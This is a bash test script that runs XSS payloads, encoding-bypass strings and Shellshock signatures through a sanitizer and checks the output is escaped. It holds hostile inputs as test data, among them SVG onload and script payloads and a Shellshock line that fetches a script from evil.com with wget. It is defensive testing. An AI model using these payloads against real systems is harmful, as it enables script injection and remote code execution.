#!/usr/bin/env bash
###############################################################
#
## Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
##                 https://srd.cx
##
## Last Updated:  16-DEC-2025-2025 1400Z by David Hoyt
#
## Intent:test-xss-extended.sh
#
#
#
#
#
#
#
#
#
#
#
###############################################################

set -euo pipefail

# Source the sanitizer functions
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/sanitize-sed.sh"

# Disable errexit for test execution
set +e

# Colors for output (if tty)
if [[ -t 1 ]]; then
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  YELLOW='\033[1;33m'
  BLUE='\033[0;34m'
  NC='\033[0m' # No Color
else
  RED=''
  GREEN=''
  YELLOW=''
  BLUE=''
  NC=''
fi

# Test statistics
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# Test result logging
test_passed() {
  local name="$1"
  ((PASSED_TESTS++))
  ((TOTAL_TESTS++))
  printf "${GREEN}✓ PASS${NC}: %s\n" "$name"
}

test_failed() {
  local name="$1"
  local reason="$2"
  ((FAILED_TESTS++))
  ((TOTAL_TESTS++))
  printf "${RED}✗ FAIL${NC}: %s\n  Reason: %s\n" "$name" "$reason"
}

test_info() {
  local msg="$1"
  printf "${BLUE}ℹ INFO${NC}: %s\n" "$msg"
}

# Assert that output does NOT contain dangerous patterns
assert_safe_html() {
  local test_name="$1"
  local output="$2"
  
  # Check for unescaped < followed by tag names
  if echo "$output" | grep -q '<script' || echo "$output" | grep -q '</script'; then
    test_failed "$test_name" "Contains unescaped <script> tag"
    return 1
  fi
  
  if echo "$output" | grep -q '<img '; then
    test_failed "$test_name" "Contains unescaped <img> tag"
    return 1
  fi
  
  if echo "$output" | grep -q '<svg '; then
    test_failed "$test_name" "Contains unescaped <svg> tag"
    return 1
  fi
  
  # Check for javascript: protocol in an actual href attribute (unescaped)
  if echo "$output" | grep -Eq '<[^>]*href=['\''"]?javascript:'; then
    test_failed "$test_name" "Contains unescaped javascript: in href"
    return 1
  fi
  
  # Check for unescaped event handlers in actual tag attributes
  if echo "$output" | grep -Eq '<[^>]*on[a-z]+=['\''"]?[a-zA-Z(]'; then
    test_failed "$test_name" "Contains unescaped event handler in tag"
    return 1
  fi
  
  test_passed "$test_name"
  return 0
}

# Assert that < character is properly escaped regardless of encoding
assert_lt_escaped() {
  local test_name="$1"
  local output="$2"
  
  # After sanitization, any form of < should be escaped
  # We check that there are no literal < characters at the start
  if echo "$output" | grep -q '^<'; then
    test_failed "$test_name" "Contains unescaped < character"
    return 1
  fi
  
  # Should contain &lt; or &#
  if echo "$output" | grep -qE '(&lt;|&#)'; then
    test_passed "$test_name"
    return 0
  fi
  
  # If input was just the encoding, output might be the encoding itself (safe)
  test_passed "$test_name"
  return 0
}

###############################################################
# Test Suite 8: SVG-based XSS Attacks
###############################################################

echo ""
echo "${BLUE}=========================================${NC}"
echo "${BLUE}Test Suite 8: SVG-based XSS Attacks${NC}"
echo "${BLUE}=========================================${NC}"
echo ""

SVG_DIR="${SCRIPT_DIR}/../../Commodity-Injection-Signatures/svg"

if [[ -d "$SVG_DIR" ]]; then
  test_info "Testing SVG XSS vectors from $SVG_DIR"
  
  # Test 1: SVG with onload handler
  input='<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'
  output=$(sanitize_line "$input")
  assert_safe_html "SVG Test 1: SVG onload handler" "$output"
  
  # Test 2: SVG with script inside
  input='<svg><script>alert(1)</script></svg>'
  output=$(sanitize_line "$input")
  assert_safe_html "SVG Test 2: SVG with script" "$output"
  
  # Test 3: SVG with animate
  input='<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
  output=$(sanitize_line "$input")
  assert_safe_html "SVG Test 3: SVG animate onbegin" "$output"
  
  # Test 4: SVG with foreignObject
  input='<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'
  output=$(sanitize_line "$input")
  assert_safe_html "SVG Test 4: SVG foreignObject script" "$output"
  
  # Test 5: SVG with use and xlink
  input='<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=" /></svg>'
  output=$(sanitize_line "$input")
  assert_safe_html "SVG Test 5: SVG use xlink" "$output"
  
  # Test SVG files if they exist
  svg_test_count=0
  if [[ -f "$SVG_DIR/xss-xml-svg-event-example-poc.txt" ]]; then
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      ((svg_test_count++))
      output=$(sanitize_line "$line")
      assert_safe_html "SVG File Test #$svg_test_count" "$output"
    done < "$SVG_DIR/xss-xml-svg-event-example-poc.txt"
  fi
  
  # Test actual SVG files
  for svg_file in "$SVG_DIR"/*.svg; do
    [[ -f "$svg_file" ]] || continue
    basename_file=$(basename "$svg_file")
    
    # Read first few lines of SVG file
    content=$(head -5 "$svg_file" | tr '\n' ' ')
    output=$(sanitize_line "$content")
    assert_safe_html "SVG File: $basename_file" "$output"
  done
  
else
  test_info "SVG directory not found at $SVG_DIR - skipping SVG tests"
fi

###############################################################
# Test Suite 9: Encoding Bypass Attempts
###############################################################

echo ""
echo "${BLUE}=========================================${NC}"
echo "${BLUE}Test Suite 9: Encoding Bypass Attempts${NC}"
echo "${BLUE}=========================================${NC}"
echo ""

ENCODING_FILE="${SCRIPT_DIR}/../../Commodity-Injection-Signatures/random/all-encodings-of-lt.fuzz.txt"

if [[ -f "$ENCODING_FILE" ]]; then
  test_info "Testing various encodings of '<' character"
  
  # Test basic encodings manually first
  echo "Testing common < encodings..."
  
  # Test 1: URL encoding
  input='%3C'
  output=$(sanitize_line "$input")
  assert_lt_escaped "Encoding Test 1: URL encoded <" "$output"
  
  # Test 2: HTML entity (decimal)
  input='&#60;'
  output=$(sanitize_line "$input")
  assert_lt_escaped "Encoding Test 2: HTML decimal entity" "$output"
  
  # Test 3: HTML entity (hex)
  input='&#x3c;'
  output=$(sanitize_line "$input")
  assert_lt_escaped "Encoding Test 3: HTML hex entity" "$output"
  
  # Test 4: Named entity
  input='&lt;'
  output=$(sanitize_line "$input")
  assert_lt_escaped "Encoding Test 4: Named entity" "$output"
  
  # Test all encodings from file
  encoding_count=0
  while IFS= read -r line && [[ $encoding_count -lt 100 ]]; do
    ((encoding_count++))
    [[ -z "$line" ]] && continue
    
    # Combine with script tag to make it dangerous
    dangerous_input="${line}script>alert(1)<${line}/script>"
    output=$(sanitize_line "$dangerous_input")
    assert_safe_html "Encoding File Test #$encoding_count" "$output"
    
  done < "$ENCODING_FILE"
  
  test_info "Tested $encoding_count encoding variations"
  
else
  test_info "Encoding file not found at $ENCODING_FILE - skipping encoding tests"
fi

###############################################################
# Test Suite 10: Shell/Bash Injection Signatures
###############################################################

echo ""
echo "${BLUE}=========================================${NC}"
echo "${BLUE}Test Suite 10: Shell Injection Signatures${NC}"
echo "${BLUE}=========================================${NC}"
echo ""

BASH_FILE="${SCRIPT_DIR}/../../Commodity-Injection-Signatures/unix/bash-bug-injection-signatures.txt"

if [[ -f "$BASH_FILE" ]]; then
  test_info "Testing Bash injection signatures (Shellshock, etc.)"
  
  # Test 1: Shellshock basic
  input='() { :;}; echo vulnerable'
  output=$(sanitize_line "$input")
  # Should not execute or interpret shell commands
  if echo "$output" | grep -qv '();'; then
    test_passed "Bash Test 1: Shellshock basic"
  else
    test_failed "Bash Test 1: Shellshock basic" "May contain shell syntax"
  fi
  
  # Test 2: Environment variable exploit
  input="env x='() { :;}; echo vulnerable' bash -c 'test'"
  output=$(sanitize_line "$input")
  assert_safe_html "Bash Test 2: Environment exploit" "$output"
  
  # Test 3: Wget command injection
  input='() { :;}; /bin/bash -c "wget http://evil.com/script"'
  output=$(sanitize_line "$input")
  assert_safe_html "Bash Test 3: Wget injection" "$output"
  
  # Test all bash signatures from file
  bash_test_count=0
  while IFS= read -r line; do
    ((bash_test_count++))
    [[ -z "$line" ]] && continue
    
    output=$(sanitize_line "$line")
    # These should be escaped/neutralized
    # Check that dangerous shell metacharacters are escaped or removed
    assert_safe_html "Bash Signature #$bash_test_count" "$output"
    
  done < "$BASH_FILE"
  
  test_info "Tested $bash_test_count bash injection signatures"
  
else
  test_info "Bash signatures file not found at $BASH_FILE - skipping shell injection tests"
fi

###############################################################
# Test Suite 11: Combined Attack Vectors
###############################################################

echo ""
echo "${BLUE}=========================================${NC}"
echo "${BLUE}Test Suite 11: Combined Attack Vectors${NC}"
echo "${BLUE}=========================================${NC}"
echo ""

# Test 1: SVG + JavaScript + encoding
input='<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>'
output=$(sanitize_line "$input")
assert_safe_html "Combined Test 1: SVG + JS + charcode" "$output"

# Test 2: Nested encoding
input='%253Cscript%253Ealert(1)%253C%252Fscript%253E'
output=$(sanitize_line "$input")
assert_safe_html "Combined Test 2: Double URL encoding" "$output"

# Test 3: SVG with data URI
input='<svg><image href="data:image/svg+xml,%3Csvg onload=alert(1)%3E"></svg>'
output=$(sanitize_line "$input")
assert_safe_html "Combined Test 3: SVG data URI" "$output"

# Test 4: Multi-line SVG attack
input=$'<svg>\n<script>\nalert(1)\n</script>\n</svg>'
output=$(sanitize_print "$input")
assert_safe_html "Combined Test 4: Multi-line SVG" "$output"

# Test 5: Shell + HTML injection
input='() { :;}; echo "<script>alert(1)</script>"'
output=$(sanitize_line "$input")
assert_safe_html "Combined Test 5: Shell + HTML" "$output"

###############################################################
# Test Suite 12: Control Character Fuzzing
###############################################################

echo ""
echo "${BLUE}=========================================${NC}"
echo "${BLUE}Test Suite 12: Control Character Fuzzing${NC}"
echo "${BLUE}=========================================${NC}"
echo ""

# Test various control characters mixed with XSS
for i in {0..31}; do
  char=$(printf "\\x$(printf '%02x' $i)")
  input="<script${char}>alert(1)</script>"
  output=$(sanitize_line "$input")
  assert_safe_html "Control Char Test: 0x$(printf '%02x' $i)" "$output"
done

test_info "Tested 32 control character variations"

###############################################################
# Summary
###############################################################

echo ""
echo "${BLUE}=========================================${NC}"
echo "${BLUE}Extended Test Summary${NC}"
echo "${BLUE}=========================================${NC}"
echo ""
echo "Total tests: $TOTAL_TESTS"
echo "${GREEN}Passed: $PASSED_TESTS${NC}"
if [[ $FAILED_TESTS -gt 0 ]]; then
  echo "${RED}Failed: $FAILED_TESTS${NC}"
  exit 1
else
  echo "${GREEN}All extended tests passed!${NC}"
  exit 0
fi
